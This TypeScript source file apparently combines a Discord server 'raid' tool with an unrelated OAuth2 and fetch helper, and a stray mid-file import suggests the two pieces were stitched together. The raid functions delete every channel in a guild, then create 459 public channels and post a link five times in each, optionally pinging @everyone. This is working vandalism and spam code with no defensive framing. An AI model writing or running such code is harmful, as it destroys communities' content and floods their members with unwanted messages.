import {
  ChannelType,
  type Guild,
  PermissionFlagsBits,
  type TextChannel,
} from 'discord.js';
import type { RaidOptions } from '../types/interfaces';

export const deleteChannels = async (guild: Guild) => {
  guild.channels.cache.forEach((c) => {
    c.delete();
  });
};

const sendMessages = async (channel: TextChannel, raidData: RaidOptions) => {
  const message = raidData.ping ? `@everyone ${raidData.link}` : raidData.link;

  for (let i = 0; i < 5; i++) {
    await channel.send(message);
  }
};

export const createChannels = async (guild: Guild, raidData: RaidOptions) => {
  if (!guild) return;

  const promises = [];

  for (let i = 0; i < 459; i++) {
    const p = (async () => {
      try {
        const channel = await guild.channels.create({
          name: raidData.name,
          topic: raidData.link,
          type: ChannelType.GuildText,
          permissionOverwrites: [
            {
              id: guild.roles.everyone.id,
              allow: [PermissionFlagsBits.ViewChannel],
            },
          ],
        });

        if (channel.isTextBased() && !channel.isVoiceBased()) {
          await sendMessages(channel as TextChannel, raidData);
        }
      } catch (error) {
        console.error(`Error en canal #${i + 1}:`, error);
      }
    })();

    promises.push(p);
  }

  await Promise.all(promises);
};

type Methods = ['get', 'post', 'put', 'delete', 'options', 'patch'][number];

import { OAuth2Client } from 'oslo/oauth2';

const authorizeEndpoint = 'https://discord.com/oauth2/authorize';
const tokenEndpoint = 'https://discord.com/api/oauth2/token';

const client = new OAuth2Client(
  process.env.DISCORD_CLIENT_ID ?? '',
  authorizeEndpoint,
  tokenEndpoint,
  { redirectURI: process.env.DISCORD_CALLBACK_URL ?? '' },
);

export async function createAuthorizationURL(
  state: string,
  options?: { scopes?: string[] },
): Promise<URL> {
  return await client.createAuthorizationURL({
    state,
    scopes: options?.scopes ?? [],
  });
}

export async function fetcher<T>(path: string, method: Methods, body: T) {
  const response = await fetch(`https://discord.com/${path}`, {
    method,
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(body),
  });
  const data = await response.json();
  return data;
}
